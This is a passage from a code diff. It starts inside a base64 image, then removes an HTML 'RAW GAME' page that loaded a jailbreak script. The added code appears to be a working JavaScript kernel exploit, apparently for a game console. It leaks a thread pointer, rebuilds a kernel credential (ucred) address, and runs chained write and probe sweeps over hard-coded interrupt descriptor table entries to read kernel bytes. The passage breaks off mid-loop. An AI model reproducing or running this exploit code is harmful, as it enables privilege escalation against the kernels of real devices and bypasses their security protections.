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"
-        alt=""
-        width="28"
-        height="28"
-      /><b>RAW GAME</b>
-    </div>
-    <div id="spin"></div>
-    <div id="msg">Restart your console</div>
-    <div id="wrap">
-      <div id="state"></div>
-      <div id="out"></div>
-    </div>
-    <script type="module">
-      import "./jb.js?v=10";
-    </script>
-  </body>
-</html>
+      const R = KB - mB + 1;
+      W0 = (kA - 1) * PAIR + R;
+      mark(
+        "PR-PASSB",
+        "m=" +
+          mB +
+          " -> R=" +
+          R +
+          "  => low dword = " +
+          W0 +
+          " (0x" +
+          (W0 >>> 0).toString(16) +
+          ")",
+      );
+    }
+
+    const UCRED = new int64(W0 >>> 0, CT1.hi >>> 0);
+    mark(
+      "PR-UCRED",
+      "ucred = " +
+        UCRED +
+        "  (high dword taken from the leaked" +
+        " curthread prefix 0x" +
+        (CT1.hi >>> 0).toString(16) +
+        ")",
+    );
+    check(
+      "pointer-read-shape-ok",
+      W0 >>> 0 !== 0 && ((W0 >>> 0) & 7) === 0,
+      "low=0x" +
+        (W0 >>> 0).toString(16) +
+        " 8-byte aligned=" +
+        (((W0 >>> 0) & 7) === 0),
+    );
+    // Read phase is done: the remaining armings (anchor, caps) touch the
+    // kernel, so from here a failure must NOT auto-reload. Reset the counter
+    // so the next manual run starts fresh.
+    clearRetry();
+
+    const IDT = new int64(0x00001a00, 0xffffff80);
+    const GATE_SZ = 16;
+
+    const RVA_RSVD = off.k_idt_rsvd;
+    const STEPMAG = 0x1000000;
+    const SWEEP = params.get("sweep") ? parseInt(params.get("sweep"), 10) : 256;
+
+    const B = {};
+    const JOBS = [
+      {
+        n: "b0",
+        j: 0,
+        g: 22,
+        want: null,
+        low: function () {
+          return 0x000000;
+        },
+      },
+      {
+        n: "b1",
+        j: 1,
+        g: 24,
+        want: null,
+        low: function () {
+          return (B.b0 << 16) >>> 0;
+        },
+      },
+      {
+        n: "b3",
+        j: 3,
+        g: 25,
+        want: 0x00,
+        low: function () {
+          return ((0x20 << 16) | (B.b1 << 8) | B.b0) >>> 0;
+        },
+      },
+      {
+        n: "b5",
+        j: 5,
+        g: 26,
+        want: 0x8e,
+        low: function () {
+          return 0x000020;
+        },
+      },
+      {
+        n: "b6",
+        j: 6,
+        g: 27,
+        want: null,
+        low: function () {
+          return 0x8e0000;
+        },
+      },
+      {
+        n: "b7",
+        j: 7,
+        g: 31,
+        want: null,
+        low: function () {
+          return ((B.b6 << 16) | 0x8e00) >>> 0;
+        },
+      },
+      {
+        n: "b6d",
+        j: 6,
+        g: 20,
+        want: null,
+        low: function () {
+          return 0x8e0000;
+        },
+      },
+      {
+        n: "b7d",
+        j: 7,
+        g: 15,
+        want: null,
+        low: function () {
+          return ((B.b6 << 16) | 0x8e00) >>> 0;
+        },
+      },
+    ];
+    const NJ = JOBS.length,
+      NEED = NJ * SWEEP * 2;
+
+    mark(
+      "ANCHOR-PLAN",
+      "idt=" +
+        IDT +
+        " rsvd_rva=0x" +
+        RVA_RSVD.toString(16) +
+        " jobs=" +
+        NJ +
+        " sweep=" +
+        SWEEP +
+        " nodes=" +
+        NEED +
+        " gates=" +
+        JOBS.map(function (q) {
+          return q.g;
+        }).join(",") +
+        " armings_so_far=" +
+        armCount,
+    );
+    if (
+      !check(
+        "anchor-nodes-bounded",
+        NEED <= MAXN && SWEEP >= 8 && SWEEP <= 1024,
+        "need=" + NEED + " arena=" + MAXN + " sweep=" + SWEEP,
+      )
+    )
+      return;
+
+    {
+      let lo = 0x1000000,
+        hi = -1;
+      for (let q = 0; q < NJ; q++) {
+        const o = JOBS[q].g * GATE_SZ + JOBS[q].j;
+        if (o - 3 < lo) lo = o - 3;
+        if (o + 3 > hi) hi = o + 3;
+      }
+      if (
+        !check(
+          "anchor-inside-idt",
+          lo >= 0 && hi < 0x1000,
+          "lo=+0x" +
+            lo.toString(16) +
+            " hi=+0x" +
+            hi.toString(16) +
+            " limit=0x1000",
+        )
+      )
+        return;
+      mark(
+        "ANCHOR-SPAN",
+        "from=" +
+          IDT.add32(lo) +
+          " to=" +
+          IDT.add32(hi) +
+          " gates=15,20-27,31 reserved=1",
+      );
+    }
+
+    const anAb = new ArrayBuffer(4 * NJ * SWEEP);
+    keepAlive.push(anAb);
+    const anDv = new DataView(anAb),
+      anAd = bufAddr(anAb);
+    for (let i = 0; i < NJ * SWEEP; i++) anDv.setInt32(i * 4, 0x40000000, true);
+
+    {
+      let idx = 0;
+      for (let q = 0; q < NJ; q++) {
+        const o = JOBS[q].g * GATE_SZ + JOBS[q].j;
+        const stepAd = IDT.add32(o);
+        const probeAd = IDT.add32(o - 3);
+        for (let k = 0; k < SWEEP; k++) {
+          wnode(idx++, stepAd, DUM, false);
+          wnode(idx++, probeAd, anAd.add32((q * SWEEP + k) * 4), false);
+        }
+      }
+      put(arDv, (idx - 1) * NODE_SZ + 0x30, 0);
+      if (runChain(idx, "anchor-sweep") === null) return;
+    }
+
+    function simPattern(bv, low) {
+      let w = ((bv << 24) >>> 0) | (low & 0xffffff) | 0;
+      let out = "";
+      for (let k = 0; k < SWEEP; k++) {
+        w = (w - STEPMAG) | 0;
+        w = (w - 1) | 0;
+        out += w <= 0 ? "1" : "0";
+      }
+      return out;
+    }
+    function decodeByte(obs, low) {
+      let hit = -1,
+        n = 0;
+      for (let bv = 0; bv < 256; bv++)
+        if (simPattern(bv, low) === obs) {
+          if (hit < 0) hit = bv;
+          n++;
+        }
+      return { b: hit, n: n };
+    }
+
+    let bad = 0;
+    for (let q = 0; q < NJ; q++) {
